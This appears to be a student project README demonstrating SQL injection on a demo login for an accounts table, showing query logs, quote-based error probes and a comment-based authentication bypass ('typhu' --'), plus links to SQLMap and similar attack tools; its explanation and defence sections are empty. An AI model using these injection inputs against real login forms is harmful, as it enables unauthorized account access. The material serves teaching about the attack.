<p align="center">
  <img src=".github/tittle.svg?sanitize=true" />
</p>

## Members:
- Tran Quang
- Nguyen Hoang Dinh Quy
- Than Hai Nhat Minh
- Nguyen Ty Phu

## Introductions

### What is the SQL Injection?

### How does it effect?

## Demo Attacks

### Log in

```
user: quang
password: demo
```
Log output consule: 
```
>> SELECT user
>>    ,checking
>>    ,savings
>> FROM accounts
>> WHERE "user" = 'typhu' AND "password" = 'demo' LIMIT 1;
```

### Try with the other user

Try with any password testing
```
user: typhu
password: demo
```

### Try with detect error

```
user: typhu
password: demo'
```
### Analysis log output

```sql
SELECT user
    ,checking
    ,savings
FROM accounts
WHERE "user" = 'typhu' AND "password" = 'demo'' LIMIT 1;
```

### Try with detect error

```
user: typhu'
password: demo
```
```sql
SELECT user
    ,checking
    ,savings
FROM accounts
WHERE "user" = 'typhu'' AND "password" = 'demo' LIMIT 1;
```
Add comment
```sql
WHERE "user" = 'typhu' --' AND "password" = 'demo' LIMIT 1;
```

### Hacking Tools

<p align="center">
  <img src=".github/sqli.png?sanitize=true" />
</p>

- [SQLMap](https://github.com/sqlmapproject/sqlmap) : Automatic SQL Injection And Database Takeover Tool
- [jSQL Injection](https://www.kitploit.com/2017/08/sqlmap-v118-automatic-sql-injection-and.html) : Java Tool For Automatic SQL Database Injection
- [BBQSQL](https://www.kitploit.com/2016/10/bbqsql-blind-sql-injection-exploitation.html) : A Blind SQL Injection Exploitation Tool
- [NoSQLMap](https://www.kitploit.com/2016/02/nosqlmap-v06-automated-nosql-database.html) : Automated NoSQL Database Pwnage

### How to protect your database from SQL Injection
